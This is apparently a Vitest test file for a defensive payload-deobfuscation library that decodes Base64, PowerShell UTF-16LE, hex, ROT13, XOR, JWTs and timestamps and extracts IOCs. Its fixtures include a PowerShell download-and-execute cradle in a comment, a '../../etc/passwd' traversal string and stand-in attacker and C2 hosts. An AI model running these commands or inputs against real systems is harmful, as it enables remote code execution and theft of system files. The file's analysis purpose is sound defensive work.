import { describe, expect, it } from "vitest";
import {
  analyzeAndDecode,
  decodeBase64Utf16Le,
  decodeBase64Utf8,
  decodeHex,
  decodeJwt,
  decodeRot13,
  decodeUnixTimestamp,
  decodeUrl,
  defangIoc,
  extractIocs,
  refangIoc,
  scanSingleByteXor,
} from "../lib/cyberDecoder";

describe("CyberDecoder — Payload Deobfuscation & Analysis", () => {
  it("decodes standard Base64 UTF-8 payloads", () => {
    // "whoami /all" in Base64
    const b64 = "d2hvYW1pIC9hbGw=";
    const res = decodeBase64Utf8(b64);
    expect(res).toBe("whoami /all");
  });

  it("decodes Windows PowerShell UTF-16LE Base64 payloads", () => {
    // "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.50/mal.ps1')"
    // In PowerShell UTF-16LE:
    // echo -n "whoami" | iconv -f UTF-8 -t UTF-16LE | base64 -> "dwBoAG8AYQBtAGkA"
    const psB64 = "dwBoAG8AYQBtAGkA";
    const res = decodeBase64Utf16Le(psB64);
    expect(res).toBe("whoami");
  });

  it("decodes hex strings and shellcode byte representations", () => {
    // "\x43\x6d\x64\x2e\x65\x78\x65" -> "Cmd.exe"
    const hexWithPrefix = "\\x43\\x6d\\x64\\x2e\\x65\\x78\\x65";
    expect(decodeHex(hexWithPrefix)).toBe("Cmd.exe");

    // Pure hex "48656c6c6f" -> "Hello"
    const rawHex = "48656c6c6f";
    expect(decodeHex(rawHex)).toBe("Hello");
  });

  it("decodes URL percent-encoded exploit strings", () => {
    const encoded = "%2e%2e%2f%2e%2e%2fetc%2fpasswd";
    expect(decodeUrl(encoded)).toBe("../../etc/passwd");
  });

  it("defangs and refangs IOCs correctly", () => {
    const live = "http://malicious.top/drop.exe";
    const defanged = defangIoc(live);
    expect(defanged).toContain("hxxp://");
    expect(defanged).toContain("malicious[.]top");

    const ip = "192.168.1.100";
    expect(defangIoc(ip)).toBe("192[.]168[.]1[.]100");

    const refanged = refangIoc("hxxps://c2-server[.]xyz/beacon");
    expect(refanged).toBe("https://c2-server.xyz/beacon");
  });

  it("extracts embedded IOCs from decoded strings", () => {
    const text = "Connecting to 10.20.30.40 and downloading from evil-domain.com hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855";
    const iocs = extractIocs(text);
    const ip = iocs.find((i) => i.type === "ip");
    const domain = iocs.find((i) => i.type === "domain");
    const hash = iocs.find((i) => i.type === "hash");

    expect(ip?.value).toBe("10.20.30.40");
    expect(domain?.value).toBe("evil-domain.com");
    expect(hash?.value).toBe("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855");
  });

  it("runs end-to-end analyzeAndDecode with candidates", () => {
    const psCommand = "dwBoAG8AYQBtAGkA"; // "whoami" in UTF-16LE
    const analysis = analyzeAndDecode(psCommand);
    expect(analysis.candidates.some((c) => c.id === "b64_utf16" && c.decoded === "whoami")).toBe(true);
  });

  it("decodes RFC 7519 JSON Web Tokens (JWT) and extracts claims", () => {
    const jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsIm5hbWUiOiJKb2huIERvZSIsImV4cCI6MTczMDAwMDAwMH0.dummy_sig";
    const res = decodeJwt(jwt);
    expect(res).not.toBeNull();
    expect(res?.id).toBe("jwt");
    expect(res?.decoded).toContain("[JWT HEADER]");
    expect(res?.decoded).toContain("[JWT CLAIMS / PAYLOAD]");
    expect(res?.decoded).toContain('"sub": "admin"');
    expect(res?.decoded).toContain("[EXPIRATION]: 2024-10-27T03:33:20.000Z");
  });

  it("decodes ROT13 cipher payloads", () => {
    const rot = "cbjrefuryy -rap";
    const res = decodeRot13(rot);
    expect(res).toBe("powershell -enc");
  });

  it("scans and decrypts single-byte XOR obfuscated commands", () => {
    // "http://evil.com" XOR with key 0x5A
    const xorHex = "322e2e2a6075753f2c333674393537";
    const res = scanSingleByteXor(xorHex);
    expect(res).not.toBeNull();
    expect(res?.id).toBe("xor_single_byte");
    expect(res?.name).toBe("XOR Decrypted (Key: 0x5A)");
    expect(res?.decoded).toBe("http://evil.com");
  });

  it("decodes 10-digit Unix epoch timestamps", () => {
    const ts = "1730000000";
    const res = decodeUnixTimestamp(ts);
    expect(res).not.toBeNull();
    expect(res?.id).toBe("timestamp");
    expect(res?.decoded).toContain("2024-10-27T03:33:20.000Z");
  });
});

